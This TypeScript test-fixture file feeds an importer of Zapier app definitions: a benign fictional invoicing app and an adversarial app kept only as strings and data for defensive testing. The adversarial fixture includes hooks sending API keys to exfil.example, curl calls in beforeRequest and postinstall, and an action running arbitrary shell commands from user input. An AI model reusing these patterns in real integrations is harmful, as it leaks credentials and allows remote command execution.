/*
 * Zapier fixtures, authored here.
 *
 * License and provenance: both fixtures are original minimal examples written
 * for this repository against the published `zapier-platform-schema` document
 * (version 19.1.0, retrieved 2026-09-18). No Zapier integration source, no
 * generated example app and no vendor sample is copied or redistributed; the
 * shapes are the schema's, which is a specification, and the content is
 * invented. "Ledgerly" is a fictional service and every host under
 * `.example` / `.invalid` is reserved by RFC 2606 and RFC 6761.
 *
 * Nothing in this file is ever required, imported, evaluated or executed. The
 * sources are strings; the importer reads them as text. The adversarial
 * fixture is written so that *if* it were ever loaded, it would leave
 * evidence: it writes a marker file and then throws. The tests assert the
 * marker does not exist.
 */

/** A declarative-ish Zapier CLI app: real shapes, invented service. */
export const nativeAppSource = `'use strict';

const listInvoices = require('./triggers/list-invoices');

const App = {
  version: require('./package.json').version,
  platformVersion: require('zapier-platform-core').version,

  authentication: {
    type: 'oauth2',
    test: { method: 'GET', url: 'https://api.ledgerly.example/v1/me' },
    connectionLabel: '{{bundle.authData.account_name}}',
    fields: [
      {
        key: 'client_id',
        label: 'Client ID',
        type: 'string',
        required: true,
        isNoSecret: true,
        helpText: 'From the Ledgerly developer console.',
      },
      {
        key: 'client_secret',
        label: 'Client secret',
        type: 'password',
        required: true,
      },
      { key: 'account_name', type: 'string', computed: true },
    ],
    oauth2Config: {
      authorizeUrl: {
        method: 'GET',
        url: 'https://auth.ledgerly.example/oauth/authorize',
      },
      getAccessToken: {
        method: 'POST',
        url: 'https://auth.ledgerly.example/oauth/token',
      },
      refreshAccessToken: {
        method: 'POST',
        url: 'https://auth.ledgerly.example/oauth/token',
      },
      scope: 'invoices:read invoices:write',
      autoRefresh: true,
      enablePkce: true,
    },
  },

  beforeRequest: [
    (request, z, bundle) => {
      request.headers.Accept = 'application/json';
      return request;
    },
  ],

  triggers: {
    new_invoice: {
      key: 'new_invoice',
      noun: 'Invoice',
      display: {
        label: 'New Invoice',
        description: 'Triggers when a new invoice is created.',
      },
      operation: {
        type: 'polling',
        perform: { method: 'GET', url: 'https://api.ledgerly.example/v1/invoices' },
        canPaginate: true,
        inputFields: [
          {
            key: 'status',
            label: 'Status',
            type: 'string',
            choices: ['draft', 'sent', 'paid'],
          },
        ],
        outputFields: [
          { key: 'id', label: 'Invoice ID', type: 'string' },
          { key: 'total_cents', label: 'Total (cents)', type: 'integer' },
        ],
        sample: { id: 'inv_1', status: 'sent', total_cents: 4200 },
      },
    },
  },

  searches: {
    find_customer: {
      key: 'find_customer',
      noun: 'Customer',
      display: {
        label: 'Find Customer',
        description: 'Finds a customer by email address.',
      },
      operation: {
        perform: { method: 'GET', url: 'https://api.ledgerly.example/v1/customers' },
        inputFields: [
          { key: 'email', label: 'Email', type: 'string', required: true },
        ],
        sample: { id: 'cus_1', email: 'person@example.invalid' },
      },
    },
  },

  creates: {
    create_invoice: {
      key: 'create_invoice',
      noun: 'Invoice',
      display: {
        label: 'Create Invoice',
        description: 'Creates a new invoice for a customer.',
      },
      operation: {
        perform: { method: 'POST', url: 'https://api.ledgerly.example/v1/invoices' },
        inputFields: [
          {
            key: 'customer_id',
            label: 'Customer',
            type: 'string',
            required: true,
            dynamic: 'find_customer.id.email',
          },
          {
            key: 'total_cents',
            label: 'Total (cents)',
            type: 'integer',
            required: true,
          },
          { key: 'memo', label: 'Memo', type: 'text' },
        ],
        sample: { id: 'inv_2', status: 'draft', total_cents: 1000 },
      },
    },
  },

  resources: {
    customer: {
      key: 'customer',
      noun: 'Customer',
      sample: { id: 'cus_1', email: 'person@example.invalid' },
      list: {
        display: {
          label: 'New Customer',
          description: 'Triggers when a customer is added.',
        },
        operation: {
          perform: { method: 'GET', url: 'https://api.ledgerly.example/v1/customers' },
        },
      },
    },
  },
};

module.exports = App;
`;

/**
 * The same app as the platform exports it: functions have become the
 * documented `$func$` pointers and `{source}`/`{require}` objects, and the
 * versions have been resolved to literals.
 */
export const nativeAppDefinition = {
  version: "1.4.0",
  platformVersion: "17.2.0",
  authentication: {
    type: "oauth2",
    test: { method: "GET", url: "https://api.ledgerly.example/v1/me" },
    connectionLabel: "{{bundle.authData.account_name}}",
    fields: [
      {
        key: "client_id",
        label: "Client ID",
        type: "string",
        required: true,
        isNoSecret: true,
        helpText: "From the Ledgerly developer console.",
      },
      {
        key: "client_secret",
        label: "Client secret",
        type: "password",
        required: true,
      },
      { key: "account_name", type: "string", computed: true },
    ],
    oauth2Config: {
      authorizeUrl: {
        method: "GET",
        url: "https://auth.ledgerly.example/oauth/authorize",
      },
      getAccessToken: {
        method: "POST",
        url: "https://auth.ledgerly.example/oauth/token",
      },
      refreshAccessToken: {
        method: "POST",
        url: "https://auth.ledgerly.example/oauth/token",
      },
      scope: "invoices:read invoices:write",
      autoRefresh: true,
      enablePkce: true,
    },
  },
  beforeRequest: ["$func$3$f$"],
  triggers: {
    new_invoice: {
      key: "new_invoice",
      noun: "Invoice",
      display: {
        label: "New Invoice",
        description: "Triggers when a new invoice is created.",
      },
      operation: {
        type: "polling",
        perform: {
          method: "GET",
          url: "https://api.ledgerly.example/v1/invoices",
        },
        canPaginate: true,
        inputFields: [
          {
            key: "status",
            label: "Status",
            type: "string",
            choices: ["draft", "sent", "paid"],
          },
        ],
        outputFields: [
          { key: "id", label: "Invoice ID", type: "string" },
          { key: "total_cents", label: "Total (cents)", type: "integer" },
        ],
        sample: { id: "inv_1", status: "sent", total_cents: 4200 },
      },
    },
  },
  searches: {
    find_customer: {
      key: "find_customer",
      noun: "Customer",
      display: {
        label: "Find Customer",
        description: "Finds a customer by email address.",
      },
      operation: {
        perform: {
          method: "GET",
          url: "https://api.ledgerly.example/v1/customers",
        },
        inputFields: [
          { key: "email", label: "Email", type: "string", required: true },
        ],
        sample: { id: "cus_1", email: "person@example.invalid" },
      },
    },
  },
  creates: {
    create_invoice: {
      key: "create_invoice",
      noun: "Invoice",
      display: {
        label: "Create Invoice",
        description: "Creates a new invoice for a customer.",
      },
      operation: {
        perform: {
          method: "POST",
          url: "https://api.ledgerly.example/v1/invoices",
        },
        inputFields: [
          {
            key: "customer_id",
            label: "Customer",
            type: "string",
            required: true,
            dynamic: "find_customer.id.email",
          },
          {
            key: "total_cents",
            label: "Total (cents)",
            type: "integer",
            required: true,
          },
          { key: "memo", label: "Memo", type: "text" },
        ],
        sample: { id: "inv_2", status: "draft", total_cents: 1000 },
      },
    },
  },
  resources: {
    customer: {
      key: "customer",
      noun: "Customer",
      sample: { id: "cus_1", email: "person@example.invalid" },
      list: {
        display: {
          label: "New Customer",
          description: "Triggers when a customer is added.",
        },
        operation: {
          perform: {
            method: "GET",
            url: "https://api.ledgerly.example/v1/customers",
          },
        },
      },
    },
  },
} as const;

export const nativeAppIdentity = {
  nativeId: "ledgerly",
  nativeVersion: "1.4.0",
  displayName: "Ledgerly",
  description: "Invoicing integration used as an import fixture.",
  service: "ledgerly",
};

/**
 * An app definition whose every interesting value is code. If this module
 * were ever loaded, the top level would write `sentinelPath` and then throw;
 * the tests assert that neither happened. It also carries a shell command in
 * an operation body, a spread of a required module, computed keys, template
 * substitutions in URLs, `{source}` and `{require}` functions, and a
 * `{{curlies}}` URL carrying a credential.
 */
export function adversarialAppSource(sentinelPath: string): string {
  const marker = JSON.stringify(sentinelPath);
  const shellMarker = JSON.stringify(`${sentinelPath}.shell`);
  return `'use strict';

const fs = require('node:fs');
const { execSync } = require('node:child_process');

// A module initializer with a side effect. Loading this file leaves evidence.
fs.writeFileSync(${marker}, 'zapier-module-initializer-executed');
execSync('touch ' + ${shellMarker});
if (!process.env.CEREMONY_IMPOSSIBLE_FLAG) {
  throw new Error('adversarial Zapier module initializer ran');
}

const smuggled = require('./smuggled-config');

module.exports = {
  version: require('./package.json').version,
  platformVersion: '17.0.0',

  authentication: {
    type: 'custom',
    test: {
      source: "return z.request({url: 'https://exfil.example/' + bundle.authData.api_key});",
    },
    fields: [
      { key: 'api_key', label: 'API key', type: 'password', required: true },
    ],
  },

  beforeRequest: [
    {
      source: "require('node:child_process').execSync('curl https://exfil.example'); return request;",
    },
  ],

  afterResponse: [{ require: './middleware/after.js' }],
  hydrators: { grabFile: '$func$2$f$' },

  ...smuggled,

  ['dynamic' + 'Collection']: { unexpected: true },

  creates: {
    run_command: {
      key: 'run_command',
      noun: 'Command',
      display: {
        label: 'Run Command',
        description: 'Runs a shell command on the integration host.',
      },
      operation: {
        perform: {
          source: "return require('node:child_process').execSync(bundle.inputData.cmd).toString();",
        },
        inputFields: [
          { key: 'cmd', label: 'Command', type: 'string', required: true },
          {
            key: 'target',
            label: 'Target',
            type: 'string',
            ['dyn' + 'amic']: 'thing.id.name',
          },
          { key: 'options', choices: { perform: '$func$0$f$' } },
        ],
        sample: { output: '' },
      },
    },
  },

  triggers: {
    webhook_echo: {
      key: 'webhook_echo',
      noun: 'Echo',
      display: { label: 'Echo', description: 'Echoes whatever is posted.' },
      operation: {
        type: 'hook',
        perform: '$func$2$f$',
        performSubscribe: { url: \`https://\${process.env.CALLBACK_HOST}/subscribe\` },
        performUnsubscribe: {
          url: 'https://exfil.example/unsubscribe?token={{bundle.authData.api_key}}',
        },
        performList: { require: './triggers/list.js' },
        inputFields: [],
        sample: {},
      },
    },
  },
};
`;
}

/** The exported-JSON spelling of the adversarial app; the same claims, as data. */
export const adversarialAppDefinition = {
  version: "0.0.1",
  platformVersion: "17.0.0",
  authentication: {
    type: "custom",
    test: {
      source:
        "return z.request({url: 'https://exfil.example/' + bundle.authData.api_key});",
    },
    fields: [
      { key: "api_key", label: "API key", type: "password", required: true },
    ],
  },
  beforeRequest: ["$func$3$f$"],
  afterResponse: [{ require: "./middleware/after.js" }],
  hydrators: { grabFile: "$func$2$f$" },
  creates: {
    run_command: {
      key: "run_command",
      noun: "Command",
      display: {
        label: "Run Command",
        description: "Runs a shell command on the integration host.",
      },
      operation: {
        perform: {
          source:
            "return require('node:child_process').execSync(bundle.inputData.cmd).toString();",
        },
        inputFields: [
          { key: "cmd", label: "Command", type: "string", required: true },
          {
            key: "target",
            label: "Target",
            type: "string",
            dynamic: "thing.id.name",
          },
          { key: "options", choices: { perform: "$func$0$f$" } },
        ],
        sample: { output: "" },
      },
    },
  },
  triggers: {
    webhook_echo: {
      key: "webhook_echo",
      noun: "Echo",
      display: { label: "Echo", description: "Echoes whatever is posted." },
      operation: {
        type: "hook",
        perform: "$func$2$f$",
        performSubscribe: {
          url: "https://exfil.example/subscribe?k={{bundle.authData.api_key}}",
        },
        performUnsubscribe: {
          url: "https://exfil.example/unsubscribe?token={{bundle.authData.api_key}}",
        },
        performList: { require: "./triggers/list.js" },
        inputFields: [],
        sample: {},
      },
    },
  },
  scripts: { postinstall: "node ./install.js && curl https://exfil.example" },
} as const;

export const adversarialAppIdentity = {
  nativeId: "adversarial-app",
  nativeVersion: "0.0.1",
  displayName: "Adversarial app",
  description: "An app whose every interesting value is code.",
  service: "adversarial",
};
